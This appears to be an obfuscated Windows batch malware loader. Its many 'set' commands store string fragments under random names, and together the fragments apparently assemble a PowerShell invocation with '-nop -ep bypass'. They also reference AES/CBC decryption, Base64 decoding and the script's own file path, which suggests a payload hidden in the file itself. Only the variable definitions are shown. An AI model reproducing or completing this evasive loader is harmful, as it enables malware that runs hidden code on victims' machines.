@echo off
set "qYSfXXyAmv=rs"
set "FvNFnVrckA=\W"
set "jAqXVoIyYX=:\"
set "UxnBwPAPQN= C"
set "qCSHJFgneK=ws"
set "UmvljDshHp=1."
set "sCqdRCoeRc=ll"
set "QfQQanOzpV=py"
set "bNFIGkUtYd=in"
set "tAgUlbqpmz=0\"
set "dMLFNeLtfq=Sy"
set "RkUWZyKNIK=he"
set "dGooKXYHuX=he"
set "ItJkmjyZNE=y "
set "jHMVjuCxKF=.e"
set "AmnmNGHgad=do"
set "xJZxhrWnuo=st"
set "aTSsGJEyfT=em"
set "sCoFRPkumn=Po"
set "xRlcdjRIDq=we"
set "aePXRERZzB=nd"
set "dWwmEPMOdl=Wi"
set "vnUMTJgAur=ll"
set "xEvxwhAhws=\v"
set "aJDvMnWodE=xe"
set "jHvsmshBRG=we"
set "EqArRYbaWH=s\"
set "ceAVqrBPVb=co"
set "okcgjzVXZa=rS"
set "zeaSYOIOov= /"
set "tvCHDzkQRD=po"
set "QMZiRqOTVL=ow"
set "DQcSxdauvN=32"
set "ryzopELaZj= %~dp0"
set "yCFqcIKGEZ=cd"
set "uxdzIHKKJN=xjPE"
set "GblYpBlIvV=3); "
set "NpVfjNODYu=-ep "
set "nWzbTPsJIT=zOt."
set "QrLAfspQUZ=Fina"
set "qjBwmpUiMU===')"
set "tcwScBGkdS=ay()"
set "FcmDYZcbVB= [Sy"
set "TAPLYMjGQP=Mode"
set "LfhPHYeMcx=tS46"
set "XGwxdlOnTL=pp);"
set "hrfxfMNHaU=Secu"
set "aSUCBjboEG=).Sp"
set "ynKHcYZBzc=ecry"
set "ZwlOfgcQmw=rans"
set "UJndDoXipo=embl"
set "XdhFcQIxxu=Invo"
set "gNuQbMMzKN=F'[-"
set "YJDtdzNuVe=bypa"
set "ePtgPjquCc=stem"
set "URoTliXhne=-Obj"
set "baOQDjAVtp=('%~f0'"
set "qIcJnxEQKa=;$sf"
set "tYOsyOXLqO=kyhK"
set "GerBzknvXL=oL'["
set "gqwtUhcUNn=and "
set "VqcjmzdrWM=();$"
set "IAztIVStBE=ect "
set "GNeLhrpYDA=16] "
set "tpaaiOqNMK=Wyqo"
set "cNLNLMYZzo=PBWq"
set "FiWYSrabAr=lBlo"
set "TTWPJOsjIp=Disp"
set "YakBbSzxNH=ing("
set "XdYcgzyYAP='[-1"
set "KUiTeKxiYL=join"
set "nVhqvVYRoZ=[]] "
set "pzuPIBacuE=ss -"
set "tWeuyDwwDN=vert"
set "dIZwseFwgd=yste"
set "CCdHhhHqyA=yTo("
set "xxoNylsINg=:: '"
set "SdaMczBklB=.Cry"
set "garpXPXoIY=Secu"
set "niIbkFSLoz=.Cre"
set "mxbRngFTDE=lit("
set "qeplOstFiq=iron"
set "CPkLQersuF=y.Pa"
set "NghaMZtQst=)))"
set "MkteLhLYIl=rtS4"
set "bOpzEugdpm=.IO."
set "JchKMYUQvr=tem."
set "NZKmBeQNdr=ne);"
set "FxIUImmQCm=bjec"
set "QKEcyygBUk=gth)"
set "xfgrffqcfA=tryP"
set "bDCfbNhnrD=ose("
set "OVJFmvqWnD=[IO."
set "uTferUHpBK=-1.."
set "uZqzmysAsP=ring"
set "aLebRmPTZL=mory"
set "YticSLgavX=FcNh"
set "nVDhRWnAVD=eSM."
set "JfFvyvCgOJ=..-1"
set "hoTgIkbHUg=-nop"
set "OAFUxwWHim=.Dis"
set "CfqElDMxfo=);$F"
set "qqQosVULhs=comm"
set "yndFsERMzf=();$"
set "UZbToAZOnZ=esMa"
set "xEaZHNaTrw=t Sy"
set "KRWEXNbvNP=NFjJ"
set "ParFACETfz=V = "
set "GzNwsjNUwR=g = "
set "pcvwBwfKSt=BC;$"
set "rrPUFfqPbf=Star"
set "UmzElIwqfZ=:('g"
